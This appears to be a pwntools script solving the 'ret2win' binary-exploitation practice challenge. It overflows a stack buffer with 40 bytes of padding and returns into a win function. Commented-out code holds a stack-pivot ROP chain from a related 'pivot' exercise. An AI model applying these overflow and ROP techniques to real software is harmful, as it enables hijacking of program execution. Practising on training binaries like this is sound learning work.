# pyright: reportGeneralTypeIssues=false
from pwn import p64
from pwn import process 
from pwn import raw_input
from pwn import log
from pwn import util 
from pwn import u64 
from pwn import ELF
from pwn import gdb
from pwn import context 
import binascii

# import re


ret2win = p64(0x00400756)
leave_ret = p64(0x00400754)
pop_rbp = p64(0x00400618) #pop rbp; ret; 
pop_rdi = p64(0x004007e3) #pop rdi; ret;
# ret2win_offset = p64(0x00000a81)
# ret2win_offset = 0x00000a81
# foothold_offset = p64(0x0000096a)
# foothold_offset = 0x0000096a
# add_offset = p64(0x00000a81 - 0x0000096a) 
# add_offset = p64(0x117)
# foothold_plt = p64(0x00400720)
# foothold_got = p64(0x0060103f)
#
# pop_rax = p64(0x004009bb)
# xchg_rax_rsp = p64(0x004009bd)
# mov_rax_rax = p64(0x004009c0) # mov rax, qword [rax]; ret
# add_rax_rbp = p64(0x004009c4) # add rax, rbp; ret
# pop_rbp = p64(0x004007c8)
# call_rax = p64(0x004006b0)

# puts = p64(0x004006e0)

# puts = p64(0x004006e0)

def exploit():
    p = process("./ret2win")
    # context.binary = binary = "./ret2win"
    # p = gdb.debug(binary)
    # p.interactive()
    raw_input(str(p.proc.pid))
    # ret2win_file = ELF("./ret2win")
    # pid = util.proc.pidof(p)
    # util.proc.wait_for_debbuger(pid)
    # log.info("PID = ", str(pid))

    # p.recvuntil("pivot: 0x")
    # raw_pivot_addr = p.recvline().strip().rjust(16,b"0")
    # pivot_addr = u64(binascii.unhexlify(raw_pivot_addr), endian='big') 
    # log.info(f'Stack pivoting addres at {hex(pivot_addr)}')

    # pivot_addr = int(p.recv(12),16)
    # log.info("address received 0x%x" % pivot_addr)

    # p.recvrepeat(0.2)
    p.recvuntil("> ")
    #stack pivot in heap
    # stack_pivot = foothold_plt
    # stack_pivot += pop_rax
    # stack_pivot += foothold_got
    # stack_pivot += pop_rbp
    # stack_pivot += add_offset 
    # stack_pivot += mov_rax_rax
    # stack_pivot += add_rax_rbp
    # stack_pivot += call_rax

    # log.info(b"stack_pivot: %a" % stack_pivot)
    offset = 40
    padding = b"A" * offset
    bof = padding
    # bof += pop_rbp
    bof += ret2win
    # bof += leave_ret

    log.info("sending bof to stack")

    # p.recvrepeat(0.2)
    # p.recvuntil("> ")

    # stack overflow, return to stack pivot
    # stack_chain = padding
    # stack_chain += pop_rax
    # stack_chain += p64(pivot_addr)
    # stack_chain += xchg_rax_rsp
    
    # log.info(b"stack_chain: %a" % stack_chain)

    p.sendline(bof)
    # p.recvuntil("foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so")
    # p.recvuntil("foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot")
    # log.success(p.recvall())
    log.success(p.clean())
    # output = p.recvall()
    # print(output)

if __name__ == "__main__":
    exploit()










    

    





